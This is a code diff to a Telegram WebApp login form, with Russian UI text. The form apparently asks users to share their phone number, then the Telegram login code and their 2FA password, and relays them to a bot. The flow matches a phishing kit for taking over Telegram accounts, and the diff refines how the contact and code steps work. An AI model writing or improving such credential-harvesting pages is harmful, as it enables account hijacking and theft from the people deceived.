@@ -25,8 +25,7 @@ document.addEventListener('DOMContentLoaded', () => {
         showLoading();
         currentStep = 'contact';
 
-        // Прямой вызов requestContact с callback (фикс для SDK issue)
-        // @ts-ignore
+        // Прямой вызов requestContact (отправляет contact боту)
         Telegram.WebApp.requestContact((contact) => {
             console.log('Contact received via direct callback:', contact);
             if (contact && contact.phone_number) {
@@ -34,13 +33,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 phoneInput.classList.remove('hidden');
                 hideLoading();
                 submitBtn.classList.remove('hidden');
-                submitBtn.textContent = 'Отправить номер';
-                statusMsg.textContent = 'Номер получен. Отправляем...';
+                submitBtn.textContent = 'Поделиться номером';
+                statusMsg.textContent = 'Номер получен. Поделитесь для отправки SMS...';
                 currentStep = 'phone';
                 tg.HapticFeedback.impactOccurred('light');
             } else {
                 console.error('Contact denied or empty');
-                throw new Error('Contact denied');
+                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
+                errorMsg.classList.remove('hidden');
+                setTimeout(resetForm, 2000);
             }
         }, (error) => {
             console.error('Request contact error:', error);
@@ -57,22 +58,13 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log('Submit clicked, step:', step);
 
         if (step === 'phone') {
-            payload = { action: 'share_phone', phone: phoneInput.value };
-            console.log('Sending phone data:', payload);
-            tg.sendData(JSON.stringify(payload));
-            showLoading();
-            statusMsg.textContent = 'Отправляем номер боту...';
-            tg.HapticFeedback.notificationOccurred('success');
-            // Увеличенный таймаут для ожидания SMS
-            setTimeout(() => {
-                console.log('Timeout: Showing code input');
-                hideLoading();
-                phoneInput.classList.add('hidden');
-                codeInput.classList.remove('hidden');
-                submitBtn.textContent = 'Отправить код';
-                statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат и SMS).';
-                currentStep = 'code';
-            }, 3000);  // 3 секунды для стабильности
+            // Контакт уже отправлен, переходим к коду
+            console.log('Contact shared, transitioning to code');
+            phoneInput.classList.add('hidden');
+            codeInput.classList.remove('hidden');
+            submitBtn.textContent = 'Отправить код';
+            statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат).';
+            currentStep = 'code';
             return;
         }
 
@@ -89,9 +81,8 @@ document.addEventListener('DOMContentLoaded', () => {
             showLoading();
             statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
-            // Таймаут для перехода к 2FA
+            // Переход к 2FA (бот сообщит, если нужно)
             setTimeout(() => {
-                console.log('Timeout: Showing 2FA input');
                 hideLoading();
                 codeInput.classList.add('hidden');
                 twoFaInput.classList.remove('hidden');
@@ -110,9 +101,7 @@ document.addEventListener('DOMContentLoaded', () => {
             showLoading();
             statusMsg.textContent = 'Подтверждаем 2FA...';
             tg.HapticFeedback.impactOccurred('heavy');
-            // Показываем success (бот уточнит в чате)
             setTimeout(() => {
-                console.log('Timeout: Showing success');
                 hideLoading();
                 successMsg.classList.remove('hidden');
                 submitBtn.classList.add('hidden');
@@ -142,7 +131,6 @@ document.addEventListener('DOMContentLoaded', () => {
         loginBtn.classList.remove('hidden');
         loginBtn.style.opacity = '1';
         currentStep = 'contact';
-        // Очистка полей
         phoneInput.value = '';
         codeInput.value = '';
         twoFaInput.value = '';
@@ -151,7 +139,6 @@ document.addEventListener('DOMContentLoaded', () => {
         statusMsg.textContent = '';
     }
 
-    // Событие после отправки данных
     tg.onEvent('webAppDataSent', () => {
         console.log('WebApp data sent');
         tg.HapticFeedback.impactOccurred('light');
